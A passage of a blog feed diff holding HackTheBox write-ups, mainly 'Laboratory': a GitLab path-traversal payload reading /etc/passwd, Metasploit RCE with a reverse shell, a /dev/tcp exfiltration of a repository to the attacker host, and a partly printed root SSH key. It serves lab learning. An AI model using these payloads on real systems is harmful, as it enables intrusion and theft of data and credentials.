+-rw------- <span class="m">1</span> root root <span class="m">1675</span> Dec  <span class="m">7</span> 16:49 id_rsa
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">405</span> Dec  <span class="m">7</span> 16:49 id_rsa.pub
+root@gitlab:/media# cat iamf/root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
+sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
+-----END RSA PRIVATE KEY-----
+</code></pre></div><h4 id="ssh-access---root-host">SSH Access - root (host)</h4>
+<p>After changing the key permissions to 600, I can login as root user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploit» «10.10.14.20» 
+$ ssh -i root_rsa root@10.10.10.220
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-40-generic x86_64<span class="o">)</span>
+
+...&lt;SNIP&gt;..
+  System load:                      0.05
+  Usage of /:                       67.1% of 17.59GB
+  Memory usage:                     84%
+  Swap usage:                       4%
+  Processes:                        <span class="m">434</span>
+  Users logged in:                  <span class="m">0</span>
+  IPv4 address <span class="k">for</span> br-bcb73b090b3f: 172.19.0.1
+  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
+  IPv4 address <span class="k">for</span> ens160:          10.10.10.220
+  IPv6 address <span class="k">for</span> ens160:          dead:beef::250:56ff:feb9:211
+
+...&lt;SNIP&gt;..
+Last login: Thu Feb <span class="m">11</span> 14:28:18 <span class="m">2021</span>
+root@ready:~# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p>I can also grab the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@ready:~# cut -c-15 root.txt 
+b7f98681505cd39
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Ready</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</link>
       <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
       
@@ -370,6 +738,393 @@ b7f98681505cd39
 <ul>
 <li><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li>
 <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Laboratory</title>
+      <link>https://fahmifj.github.io/hackthebox/laboratory/</link>
+      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/laboratory/</guid>
+      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
+      <content:encoded><![CDATA[<p>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container reveals a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Arbitrary File Read</li>
+<li>Adding Metasploit module</li>
+<li>Exploiting GitLab 12.8.1~12.9.0</li>
+<li>Recover a git repository</li>
+<li>SUID exploitation</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Metasploit - Preinstalled in Kali Linux</li>
+<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.41
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: The Laboratory
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+<span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
+<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+<span class="p">|</span> Public Key type: rsa
+<span class="p">|</span> Public Key bits: <span class="m">4096</span>
+<span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+<span class="p">|</span> Not valid before: 2020-07-05T10:39:28
+<span class="p">|</span> Not valid after:  2024-03-03T10:39:28
+<span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
+<span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
+<span class="p">|</span> tls-alpn: 
+<span class="p">|</span>_  http/1.1
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
+<p>On the HTTPS port, the certificate discloses a subdomain.</p>
+<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
+<p>There is nothing really interesting here.</p>
+<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
+</p>
+<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
+<p>A GitLab instance is presented on this page.</p>
+<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
+</p>
+<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
+<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
+</p>
+<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
+<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
+<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
+</p>
+<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
+<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
+</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ searchsploit gitlab
+------------------------------------------------------------------------- -----------------------------
+Exploit Title                                                           <span class="p">|</span>  Path
+------------------------------------------------------------------------- -----------------------------
+GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
+GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
+GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
+Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
+Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
+Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
+NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
+------------------------------------------------------------------------- ------------------------------
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-git">Shell as git</h3>
+<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
+<blockquote>
+<p>CVE-2020-10977:
+GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
+</blockquote>
+<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
+<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
+</p>
+<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
+</p>
+<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
+<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
+</p>
+<p>The payload will then turn into an attached file.</p>
+<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
+</p>
+<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
+<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
+</p>
+<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
+<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
+
+...&lt;SNIP&gt;...
+<span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
+<span class="o">[</span>+<span class="o">]</span> Username      : iamf
+<span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
+<span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo
+
+<span class="o">[</span>!<span class="o">]</span> Trying to Login...
+<span class="o">[</span>+<span class="o">]</span> Login Successful!
+<span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
+<span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
+<span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
+<span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
+<span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
+<span class="o">[</span>!<span class="o">]</span> Creating an Issue...
+<span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
+<span class="o">[</span>!<span class="o">]</span> Moving Issue...
+<span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
+<span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
+
+&gt; /etc/passwd
+----------------------------------------
+
+...&lt;SNIP&gt;...
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
+<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
+<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
+<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
+</code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ msfdb reinit
+<span class="o">[</span>+<span class="o">]</span> Starting database
+<span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+<span class="o">[</span>+<span class="o">]</span> Stopping database
+<span class="o">[</span>+<span class="o">]</span> Starting database
+<span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Creating initial database schema
+</code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
+<span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
+</code></pre></div><p>Below are the options needed by the module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
+<span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
+<span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
+<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
+<span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
+<span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
+<span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
+<span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
+msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
+</code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
+<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
+<span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
+<span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
+<span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
+<span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
+<span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
+<span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+<span class="o">[</span>*<span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
+<span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/hpt2TORA
+<span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/hpt2TORA
+<span class="o">[</span>*<span class="o">]</span> Attempting to delete project /iamf/ysGE0u0L
+<span class="o">[</span>*<span class="o">]</span> Deleted project /iamf/ysGE0u0L
+<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class="o">)</span> at 2021-03-21 17:46:14 -0400
+
+id<span class="p">;</span>hostname
+<span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
+git.laboratory.htb
+</code></pre></div><p>I have shell as user <code>git</code>.</p>
+<p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">ls -la /
+total <span class="m">88</span>
+drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .
+drwxr-xr-x   <span class="m">1</span> root root <span class="m">4096</span> Jul  <span class="m">2</span>  <span class="m">2020</span> ..
+-rwxr-xr-x   <span class="m">1</span> root root    <span class="m">0</span> Jul  <span class="m">2</span>  <span class="m">2020</span> .dockerenv
+-rw-r--r--   <span class="m">1</span> root root  <span class="m">157</span> Feb <span class="m">24</span>  <span class="m">2020</span> RELEASE
+drwxr-xr-x   <span class="m">2</span> root root <span class="m">4096</span> Feb <span class="m">24</span>  <span class="m">2020</span> assets
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-dexter">Shell as dexter</h3>
+<h4 id="container-enumeration">Container enumeration</h4>
+<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~$ grep -Ri dexter 2&gt;/dev/null
+
+git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securedocker
+git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class="nv">fullpath</span> <span class="o">=</span> dexter/securewebsite
+</code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+total <span class="m">40</span>
+drwxr-s---  <span class="m">6</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> .
+drwxr-s---  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> ..
+-rw-r--r--  <span class="m">1</span> git root   <span class="m">23</span> Jul  <span class="m">5</span>  <span class="m">2020</span> HEAD
+-rw-r--r--  <span class="m">1</span> git root  <span class="m">107</span> Jul  <span class="m">5</span>  <span class="m">2020</span> config
+-rw-r--r--  <span class="m">1</span> git root   <span class="m">73</span> Jul  <span class="m">5</span>  <span class="m">2020</span> description
+drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> hooks
+drwxr-sr-x  <span class="m">2</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> info
+-rw-r--r--  <span class="m">1</span> git root  <span class="m">112</span> Jul  <span class="m">5</span>  <span class="m">2020</span> language-stats.cache
+drwxr-sr-x <span class="m">14</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> objects
+drwxr-sr-x  <span class="m">4</span> git root <span class="m">4096</span> Jul  <span class="m">5</span>  <span class="m">2020</span> refs
+</code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+</code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
+$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
+</code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
+</code></pre></div><p>My listener received the tarball.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
+$ nc -nvlp <span class="m">9000</span> &gt; exfil-securedocker-git.tar
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216<span class="o">]</span> <span class="m">42426</span>
+</code></pre></div><h4 id="recovering-securedocker-repository">Recovering &lsquo;securedocker&rsquo; repository</h4>
+<p>After extracting the repository,  <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «10.10.14.39»
+$ tar -xzf exfil-securedocker-git.tar
+→ root@iamf «loot» «10.10.14.39»
+$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
+→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ 
+</code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ git status
+fatal: this operation must be run in a work tree
+</code></pre></div><blockquote>
+<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
+</blockquote>
+<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ mkdir .git
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ mv * .git
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ git status
+fatal: this operation must be run in a work tree
+</code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
+$ git init
+Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
+$ git status
+On branch master
+Changes to be committed:
+  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
+        deleted:    README.md
+        deleted:    create_gitlab.sh
+        deleted:    dexter/.ssh/authorized_keys
+        deleted:    dexter/.ssh/id_rsa
+        deleted:    dexter/recipe.url
+        deleted:    dexter/todo.txt
